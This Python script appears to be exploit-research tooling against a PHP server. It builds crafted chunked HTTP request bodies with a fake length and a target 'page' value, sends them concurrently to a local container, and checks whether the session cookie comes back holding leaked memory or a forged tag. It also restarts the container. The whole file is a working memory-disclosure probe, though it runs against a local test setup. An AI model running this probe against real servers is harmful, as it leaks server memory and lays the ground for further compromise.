#!/usr/bin/env python3
"""Compact id-page prober.

Build a minimal B1 (one G:511:<page> field, small fake_len) and check whether the
response cookie begins with our forge tag. Validated against the known 8.4 page
0x137 before being used on unknown builds.

Usage:
  probe_page.py --port 19001 --a1 a1.bin --page 0x137 [--page 0x130 ...]
                [--fields 1] [--tries 5] [--restart container] [--outdir DIR]
"""
import argparse, os, re, struct, subprocess, sys, time, urllib.parse
from concurrent.futures import ThreadPoolExecutor

PURE = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure"
MK = "/tmp/opencode/research/modphp_109619_20261023T010232Z/scripts/mk_leak_b2.py"
QS = "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"


def sh(cmd, timeout=300):
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def build(page, fields, fake_len):
    spec = ",".join("G:511:%d" % page for _ in range(fields))
    out = "/tmp/probe_p%x_f%d.bin" % (page, fields)
    r = sh([sys.executable, MK, "--out", out, "--spec", spec,
            "--fake-len", hex(fake_len)])
    if r.returncode:
        raise RuntimeError(r.stderr[-300:])
    return out


def send(port, path, body, save):
    cmd = [sys.executable, os.path.join(PURE, "chunked_send.py"), "--port", str(port),
           "--body-file", body, "--path", path, "--timeout", "90",
           "--save-response", save]
    r = sh(cmd, timeout=120)
    m = re.search(r"resp=(\d+) status='([^']*)'", r.stdout)
    return (int(m.group(1)), m.group(2)) if m else (-1, "ERR")


def cookie_head(save):
    try:
        raw = open(save, "rb").read()
    except OSError:
        return None
    i = raw.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        return None
    v = raw[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    return urllib.parse.unquote_to_bytes(v.decode("latin1", "replace"))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--container")
    ap.add_argument("--a1", required=True)
    ap.add_argument("--page", action="append", required=True,
                    help="hex page, e.g. 0x137 (may repeat)")
    ap.add_argument("--fields", type=int, default=1)
    ap.add_argument("--tries", type=int, default=5)
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0x40)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--no-restart", action="store_true")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    if args.container and not args.no_restart:
        sh(["docker", "restart", args.container]); time.sleep(1.5)
    # warmup
    try:
        import socket
        s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
        s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n"); s.recv(4096); s.close()
    except OSError:
        pass
    n, st = send(args.port, QS, args.a1, os.path.join(args.outdir, "a1.resp"))
    print("A1 resp=%d status=%s" % (n, st), flush=True)
    for page in [int(p, 0) for p in args.page]:
        body = build(page, args.fields, args.fake_len)
        saves = [os.path.join(args.outdir, "b1_%x_%d.resp" % (page, i)) for i in range(args.tries)]
        with ThreadPoolExecutor(max_workers=args.tries) as ex:
            futs = [ex.submit(send, args.port, "/index.php", body, s) for s in saves]
            res = [f.result() for f in futs]
        hits = []
        for i, (s, (n, stt)) in enumerate(zip(saves, res)):
            d = cookie_head(s)
            if d is None:
                continue
            tag = d[:8]
            if len(d) > 0x1000 or tag.startswith(b"BBBB/BBB") or tag.startswith(b"/"):
                hits.append((i, len(d), tag))
        print("page=%#x fields=%d hits=%s statuses=%s" % (
            page, args.fields, hits, [r[1] for r in res]), flush=True)
        with open(os.path.join(args.outdir, "scan.tsv"), "a") as fh:
            fh.write("%#x\t%d\t%s\t%s\n" % (page, len(hits), hits, [r[1] for r in res]))
        os.unlink(body)


if __name__ == "__main__":
    main()
